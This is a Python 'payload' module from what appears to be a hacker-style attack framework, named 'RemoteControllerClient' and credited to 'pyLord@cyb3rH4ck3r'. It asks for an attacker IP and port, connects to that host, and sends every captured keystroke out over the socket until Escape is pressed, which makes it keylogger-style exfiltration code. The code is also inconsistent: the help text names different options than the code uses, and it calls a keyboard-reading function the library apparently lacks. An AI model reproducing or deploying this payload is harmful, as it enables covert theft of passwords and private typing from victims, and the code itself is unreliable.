import pyfiglet
from collections import OrderedDict
import pyautogui
import socket

MODULE_TYPE = "payload"
# Module class definition
class ModuleClass:
    def __init__(self):
        self.info = {
            'Name': 'RemoteControllerClient',
            'Rank':'Good',
            'Platform':'Windows/Linux/Mac',
            'architectures':'x86/64 bit processors',
            'Description': 'Remotely control a computer  ',
            'Note':'Should be used with its client',
            'Author': 'pyLord@cyb3rH4ck3r',
            'Date Release': 'Tue/4/March/2025',
            'Options': OrderedDict([
            ('RHOST', ('', True,'Enter Attacker IP')),
            ('RPORT', ('', True,'Enter Attacker port'))
           
               
                ])
                }
    def logo(self):
    	title = 'RemoteController '
    	if pyfiglet:
    	       ascii_text = pyfiglet.figlet_format(title, font="standard")
    	       print(f"\033[91m{ascii_text}\033[0m")
    	else:
            print(title)
    def help(self):
    	print("Usage: set LHOST <ip_address> | set LPORT <port>, then run")
   
    
    def execute(self):
        self.logo()
        RHOST = self.info['Options']['RHOST'][0]
        RPORT  = self.info['Options']['RPORT'][0]
        # Set up the remote connection
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((RHOST, int(RPORT)))
        # Get the remote PC's keyboard input
        while True:
            key = pyautogui.readKey()
            if key == 'esc':
                break
            sock.sendall(key.encode())
        # Clean up
        sock.close()
        
        
        return f"[+] Waiting for Server ..."
    